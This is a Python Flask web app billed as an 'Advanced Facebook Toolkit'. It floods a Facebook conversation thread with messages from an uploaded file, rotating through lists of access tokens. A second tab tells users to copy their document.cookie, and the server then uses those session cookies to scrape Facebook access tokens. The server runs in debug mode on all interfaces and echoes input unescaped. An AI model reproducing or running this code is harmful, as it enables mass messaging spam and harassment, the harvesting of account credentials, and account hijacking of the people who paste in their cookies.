from flask import Flask, request, render_template_string, jsonify
import requests
from threading import Thread, Event
import time
import random
import string
import re

app = Flask(__name__)
app.debug = True

headers = {
    'Connection': 'keep-alive',
    'Cache-Control': 'max-age=0',
    'Upgrade-Insecure-Requests': '1',
    'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
    'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8',
    'Accept-Encoding': 'gzip, deflate',
    'Accept-Language': 'en-US,en;q=0.9',
    'referer': 'www.google.com'
}

stop_events = {}
threads = {}

def send_messages(access_tokens, thread_id, mn, time_interval, messages, task_id):
    stop_event = stop_events[task_id]
    while not stop_event.is_set():
        for message1 in messages:
            if stop_event.is_set():
                break
            for access_token in access_tokens:
                api_url = f'https://graph.facebook.com/v15.0/t_{thread_id}/'
                message = str(mn) + ' ' + message1
                parameters = {'access_token': access_token, 'message': message}
                try:
                    response = requests.post(api_url, data=parameters, headers=headers, timeout=10)
                    if response.status_code == 200:
                        print(f"✓ Message Sent Successfully From token {access_token[:20]}...: {message}")
                    else:
                        print(f"✗ Message Failed From token {access_token[:20]}...: {response.text[:100]}")
                except Exception as e:
                    print(f"Error: {str(e)[:100]}")
                time.sleep(time_interval)

def extract_token_from_cookie(cookie):
    """Extract Facebook access token from cookie string"""
    patterns = [
        r'EAABsb[A-Za-z0-9]+',
        r'EAAC[A-Za-z0-9]+',
        r'EAAG[A-Za-z0-9]+',
        r'EAAD[A-Za-z0-9]+',
        r'EAAAA[A-Za-z0-9]+'
    ]
    
    for pattern in patterns:
        match = re.search(pattern, cookie)
        if match:
            return match.group(0)
    return None

def extract_token_from_response(response_text):
    """Extract access token from Facebook response"""
    patterns = [
        r'access_token=([A-Za-z0-9]+)',
        r'"accessToken":"([A-Za-z0-9]+)"',
        r'access_token":"([A-Za-z0-9]+)"'
    ]
    
    for pattern in patterns:
        match = re.search(pattern, response_text)
        if match:
            return match.group(1)
    return None

@app.route('/', methods=['GET', 'POST'])
def send_message():
    if request.method == 'POST':
        action = request.form.get('action', 'send')
        
        if action == 'extract':
            cookie_input = request.form.get('cookieInput', '')
            extracted_tokens = []
            
            if cookie_input:
                # Extract from cookie
                token = extract_token_from_cookie(cookie_input)
                if token:
                    extracted_tokens.append(token)
                
                # Try to fetch from Facebook if cookie provided
                try:
                    fb_headers = headers.copy()
                    fb_headers['Cookie'] = cookie_input
                    response = requests.get('https://mbasic.facebook.com/', headers=fb_headers, timeout=10)
                    token = extract_token_from_response(response.text)
                    if token and token not in extracted_tokens:
                        extracted_tokens.append(token)
                except:
                    pass
            
            if extracted_tokens:
                return jsonify({'success': True, 'tokens': extracted_tokens})
            else:
                return jsonify({'success': False, 'message': 'No token found in cookie'})
        
        else:
            token_option = request.form.get('tokenOption')
            
            if token_option == 'single':
                access_tokens = [request.form.get('singleToken')]
            else:
                token_file = request.files['tokenFile']
                access_tokens = token_file.read().decode().strip().splitlines()
            
            # Filter valid tokens
            access_tokens = [token.strip() for token in access_tokens if token.strip()]
            
            thread_id = request.form.get('threadId')
            mn = request.form.get('kidx')
            time_interval = int(request.form.get('time'))
            
            txt_file = request.files['txtFile']
            messages = txt_file.read().decode().splitlines()
            
            task_id = ''.join(random.choices(string.ascii_letters + string.digits, k=8))
            
            stop_events[task_id] = Event()
            thread = Thread(target=send_messages, args=(access_tokens, thread_id, mn, time_interval, messages, task_id))
            threads[task_id] = thread
            thread.start()
            
            return f'''
            <div style="color: green; padding: 20px;">
                <h3>✓ Task Started Successfully!</h3>
                <p>Task ID: <strong>{task_id}</strong></p>
                <p>Tokens Loaded: {len(access_tokens)}</p>
                <p>Messages: {len(messages)}</p>
                <button onclick="location.href='/'" style="padding: 10px; background: #007bff; color: white; border: none; border-radius: 5px;">Back to Home</button>
            </div>
            '''
    
    return render_template_string('''
<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="utf-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>♛ AHMAD ALI SAFDAR ♛</title>
  <link href="https://cdn.jsdelivr.net/npm/bootstrap@5.0.2/dist/css/bootstrap.min.css" rel="stylesheet">
  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/5.15.4/css/all.min.css">
  <style>
    * {
      margin: 0;
      padding: 0;
      box-sizing: border-box;
    }
    body {
      background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
      min-height: 100vh;
      color: white;
      font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
    }
    .main-container {
      max-width: 1200px;
      margin: 0 auto;
      padding: 20px;
    }
    .header {
      text-align: center;
      padding: 20px;
      background: rgba(0,0,0,0.3);
      border-radius: 15px;
      margin-bottom: 30px;
      box-shadow: 0 5px 15px rgba(0,0,0,0.3);
    }
    .header h1 {
      font-size: 2.5em;
      text-shadow: 2px 2px 4px rgba(0,0,0,0.5);
      animation: glow 2s ease-in-out infinite alternate;
    }
    @keyframes glow {
      from { text-shadow: 0 0 10px #fff, 0 0 20px #fff; }
      to { text-shadow: 0 0 20px #ff00ff, 0 0 30px #ff00ff; }
    }
    .tabs {
      display: flex;
      justify-content: center;
      gap: 10px;
      margin-bottom: 30px;
    }
    .tab-btn {
      padding: 12px 30px;
      background: rgba(255,255,255,0.2);
      border: 2px solid rgba(255,255,255,0.3);
      color: white;
      border-radius: 10px;
      cursor: pointer;
      font-size: 16px;
      font-weight: bold;
      transition: all 0.3s;
    }
    .tab-btn:hover {
      background: rgba(255,255,255,0.3);
      transform: translateY(-2px);
    }
    .tab-btn.active {
      background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
      border-color: white;
      box-shadow: 0 0 20px rgba(102,126,234,0.5);
    }
    .tab-content {
      display: none;
      background: rgba(0,0,0,0.4);
      border-radius: 15px;
      padding: 30px;
      backdrop-filter: blur(10px);
      box-shadow: 0 8px 32px rgba(0,0,0,0.3);
    }
    .tab-content.active {
      display: block;
    }
    .form-group {
      margin-bottom: 20px;
    }
    .form-label {
      display: block;
      margin-bottom: 8px;
      font-weight: bold;
      color: #fff;
    }
    .form-control {
      width: 100%;
      padding: 12px;
      background: rgba(255,255,255,0.1);
      border: 2px solid rgba(255,255,255,0.2);
      border-radius: 8px;
      color: white;
      font-size: 16px;
      transition: all 0.3s;
    }
    .form-control:focus {
      outline: none;
      border-color: #667eea;
      background: rgba(255,255,255,0.2);
      box-shadow: 0 0 10px rgba(102,126,234,0.5);
    }
    .form-control::placeholder {
      color: rgba(255,255,255,0.6);
    }
    select.form-control option {
      background: #333;
    }
    .btn {
      padding: 12px 30px;
      border: none;
      border-radius: 8px;
      font-size: 16px;
      font-weight: bold;
      cursor: pointer;
      transition: all 0.3s;
    }
    .btn-primary {
      background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
      color: white;
    }
    .btn-primary:hover {
      transform: translateY(-2px);
      box-shadow: 0 5px 20px rgba(102,126,234,0.4);
    }
    .btn-success {
      background: linear-gradient(135deg, #11998e 0%, #38ef7d 100%);
      color: white;
    }
    .btn-success:hover {
      transform: translateY(-2px);
      box-shadow: 0 5px 20px rgba(56,239,125,0.4);
    }
    .btn-danger {
      background: linear-gradient(135deg, #eb3349 0%, #f45c43 100%);
      color: white;
    }
    .btn-danger:hover {
      transform: translateY(-2px);
      box-shadow: 0 5px 20px rgba(235,51,73,0.4);
    }
    .token-result {
      margin-top: 20px;
      padding: 15px;
      background: rgba(0,0,0,0.3);
      border-radius: 8px;
      border-left: 4px solid #38ef7d;
      word-break: break-all;
    }
    .footer {
      text-align: center;
      margin-top: 40px;
      padding: 20px;
      background: rgba(0,0,0,0.3);
      border-radius: 15px;
    }
    .social-links {
      display: flex;
      justify-content: center;
      gap: 20px;
      margin-top: 15px;
    }
    .social-link {
      color: white;
      text-decoration: none;
      padding: 10px 20px;
      background: rgba(255,255,255,0.1);
      border-radius: 8px;
      transition: all 0.3s;
    }
    .social-link:hover {
      background: rgba(255,255,255,0.2);
      transform: translateY(-2px);
      color: white;
    }
    .info-box {
      background: rgba(102,126,234,0.2);
      padding: 15px;
      border-radius: 8px;
      margin-bottom: 20px;
      border: 1px solid rgba(102,126,234,0.3);
    }
    .token-display {
      max-height: 200px;
      overflow-y: auto;
      padding: 10px;
      background: rgba(0,0,0,0.3);
      border-radius: 5px;
      margin-top: 10px;
    }
  </style>
</head>
<body>
  <div class="main-container">
    <header class="header">
      <h1>♛ 𝐀𝐇𝐌𝐀𝐃 𝐀𝐋𝐈 𝐒𝐀𝐅𝐃𝐀𝐑 ♛</h1>
      <p style="margin-top: 10px; opacity: 0.9;">Advanced Facebook Toolkit</p>
    </header>

    <div class="tabs">
      <button class="tab-btn active" onclick="showTab('sender')">
        <i class="fas fa-paper-plane"></i> Message Sender
      </button>
      <button class="tab-btn" onclick="showTab('extractor')">
        <i class="fas fa-key"></i> Token Extractor
      </button>
      <button class="tab-btn" onclick="showTab('stopper')">
        <i class="fas fa-stop-circle"></i> Stop Task
      </button>
    </div>

    <!-- Message Sender Tab -->
    <div id="sender" class="tab-content active">
      <div class="info-box">
        <i class="fas fa-info-circle"></i> 
        <strong>Instructions:</strong> Fill all fields to start sending messages automatically.
      </div>
      
      <form method="post" enctype="multipart/form-data">
        <input type="hidden" name="action" value="send">
        
        <div class="form-group">
          <label class="form-label">
            <i class="fas fa-token"></i> Token Option
          </label>
          <select class="form-control" id="tokenOption" name="tokenOption" onchange="toggleTokenInput()" required>
            <option value="single">Single Token</option>
            <option value="multiple">Token File (Multiple Tokens)</option>
          </select>
        </div>
        
        <div class="form-group" id="singleTokenInput">
          <label class="form-label">
            <i class="fas fa-key"></i> Enter Access Token
          </label>
          <input type="text" class="form-control" id="singleToken" name="singleToken" placeholder="EAA...">
        </div>
        
        <div class="form-group" id="tokenFileInput" style="display: none;">
          <label class="form-label">
            <i class="fas fa-file"></i> Choose Token File (.txt)
          </label>
          <input type="file" class="form-control" id="tokenFile" name="tokenFile" accept=".txt">
          <small style="color: #aaa;">One token per line</small>
        </div>
        
        <div class="form-group">
          <label class="form-label">
            <i class="fas fa-comments"></i> Conversation/Thread ID
          </label>
          <input type="text" class="form-control" id="threadId" name="threadId" placeholder="t_123456789..." required>
        </div>
        
        <div class="form-group">
          <label class="form-label">
            <i class="fas fa-user"></i> Sender Name Prefix
          </label>
          <input type="text" class="form-control" id="kidx" name="kidx" placeholder="Your Name" required>
        </div>
        
        <div class="form-group">
          <label class="form-label">
            <i class="fas fa-clock"></i> Time Interval (seconds)
          </label>
          <input type="number" class="form-control" id="time" name="time" value="5" min="1" required>
        </div>
        
        <div class="form-group">
          <label class="form-label">
            <i class="fas fa-file-alt"></i> Messages File (.txt)
          </label>
          <input type="file" class="form-control" id="txtFile" name="txtFile" accept=".txt" required>
          <small style="color: #aaa;">One message per line</small>
        </div>
        
        <button type="submit" class="btn btn-primary" style="width: 100%;">
          <i class="fas fa-play"></i> Start Sending Messages
        </button>
      </form>
    </div>

    <!-- Token Extractor Tab -->
    <div id="extractor" class="tab-content">
      <div class="info-box">
        <i class="fas fa-lightbulb"></i>
        <strong>How to get cookie:</strong> Login to Facebook → Press F12 → Console Tab → Type: document.cookie → Copy the result
      </div>
      
      <div class="form-group">
        <label class="form-label">
          <i class="fas fa-cookie-bite"></i> Paste Facebook Cookie
        </label>
        <textarea class="form-control" id="cookieInput" rows="5" placeholder="Paste your Facebook cookie here..."></textarea>
      </div>
      
      <button class="btn btn-success" onclick="extractToken()" style="width: 100%;">
        <i class="fas fa-search"></i> Extract Token
      </button>
      
      <div id="tokenResult" class="token-result" style="display: none;">
        <h4><i class="fas fa-check-circle" style="color: #38ef7d;"></i> Extracted Tokens:</h4>
        <div id="tokenList" class="token-display"></div>
        <button class="btn btn-primary" onclick="copyTokens()" style="margin-top: 10px;">
          <i class="fas fa-copy"></i> Copy All Tokens
        </button>
      </div>
    </div>

    <!-- Stop Task Tab -->
    <div id="stopper" class="tab-content">
      <div class="info-box">
        <i class="fas fa-info-circle"></i>
        <strong>Stop Running Task:</strong> Enter the Task ID provided when you started the message sender.
      </div>
      
      <form method="post" action="/stop">
        <div class="form-group">
          <label class="form-label">
            <i class="fas fa-id-card"></i> Task ID
          </label>
          <input type="text" class="form-control" id="taskId" name="taskId" placeholder="Enter Task ID" required>
        </div>
        
        <button type="submit" class="btn btn-danger" style="width: 100%;">
          <i class="fas fa-stop"></i> Stop Task
        </button>
      </form>
    </div>

    <footer class="footer">
      <p>© 2024 Developed by ♛ AHMAD ALI SAFDAR ♛</p>
      <div class="social-links">
        <a href="https://www.facebook.com/ahmadali.safdar.52" class="social-link" target="_blank">
          <i class="fab fa-facebook"></i> Facebook
        </a>
        <a href="https://wa.me/+923324661564" class="social-link" target="_blank">
          <i class="fab fa-whatsapp"></i> WhatsApp
        </a>
      </div>
    </footer>
  </div>

  <script>
    function showTab(tabName) {
      // Hide all tabs
      document.querySelectorAll('.tab-content').forEach(tab => {
        tab.classList.remove('active');
      });
      
      // Remove active class from all buttons
      document.querySelectorAll('.tab-btn').forEach(btn => {
        btn.classList.remove('active');
      });
      
      // Show selected tab
      document.getElementById(tabName).classList.add('active');
      
      // Add active class to clicked button
      event.target.classList.add('active');
    }
    
    function toggleTokenInput() {
      var tokenOption = document.getElementById('tokenOption').value;
      if (tokenOption == 'single') {
        document.getElementById('singleTokenInput').style.display = 'block';
        document.getElementById('tokenFileInput').style.display = 'none';
      } else {
        document.getElementById('singleTokenInput').style.display = 'none';
        document.getElementById('tokenFileInput').style.display = 'block';
      }
    }
    
    function extractToken() {
      const cookieInput = document.getElementById('cookieInput').value;
      
      if (!cookieInput) {
        alert('Please paste your Facebook cookie first!');
        return;
      }
      
      const formData = new FormData();
      formData.append('action', 'extract');
      formData.append('cookieInput', cookieInput);
      
      fetch('/', {
        method: 'POST',
        body: formData
      })
      .then(response => response.json())
      .then(data => {
        const resultDiv = document.getElementById('tokenResult');
        const tokenList = document.getElementById('tokenList');
        
        if (data.success) {
          let html = '';
          data.tokens.forEach((token, index) => {
            html += `<div style="margin-bottom: 10px; padding: 5px; background: rgba(255,255,255,0.1); border-radius: 5px;">
              <strong>Token ${index + 1}:</strong><br>
              <span style="word-break: break-all;">${token}</span>
            </div>`;
          });
          tokenList.innerHTML = html;
          resultDiv.style.display = 'block';
          
          // Store tokens for copying
          window.extractedTokens = data.tokens;
        } else {
          alert('No token found in the cookie! Make sure you copied the full cookie string.');
        }
      })
      .catch(error => {
        alert('Error extracting token: ' + error);
      });
    }
    
    function copyTokens() {
      if (window.extractedTokens && window.extractedTokens.length > 0) {
        const textToCopy = window.extractedTokens.join('\\n');
        navigator.clipboard.writeText(textToCopy).then(() => {
          alert('Tokens copied to clipboard!');
        }).catch(err => {
          // Fallback
          const textarea = document.createElement('textarea');
          textarea.value = textToCopy;
          document.body.appendChild(textarea);
          textarea.select();
          document.execCommand('copy');
          document.body.removeChild(textarea);
          alert('Tokens copied to clipboard!');
        });
      }
    }
    
    // Initialize token input visibility
    document.addEventListener('DOMContentLoaded', function() {
      toggleTokenInput();
    });
  </script>
</body>
</html>
''')

@app.route('/stop', methods=['POST'])
def stop_task():
    task_id = request.form.get('taskId')
    if task_id in stop_events:
        stop_events[task_id].set()
        return f'''
        <div style="color: green; padding: 20px; text-align: center;">
            <h3>✓ Task with ID {task_id} has been stopped successfully!</h3>
            <button onclick="location.href='/'" style="padding: 10px; background: #007bff; color: white; border: none; border-radius: 5px; margin-top: 20px;">Back to Home</button>
        </div>
        '''
    else:
        return f'''
        <div style="color: red; padding: 20px; text-align: center;">
            <h3>✗ No task found with ID: {task_id}</h3>
            <button onclick="location.href='/'" style="padding: 10px; background: #007bff; color: white; border: none; border-radius: 5px; margin-top: 20px;">Back to Home</button>
        </div>
        '''

if __name__ == '__main__':
    print("\n" + "="*50)
    print("♛ AHMAD ALI SAFDAR - Facebook Toolkit ♛")
    print("="*50)
    print("Server running at: http://0.0.0.0:5000")
    print("Press Ctrl+C to stop the server")
    print("="*50 + "\n")
    app.run(host='0.0.0.0', port=5000)
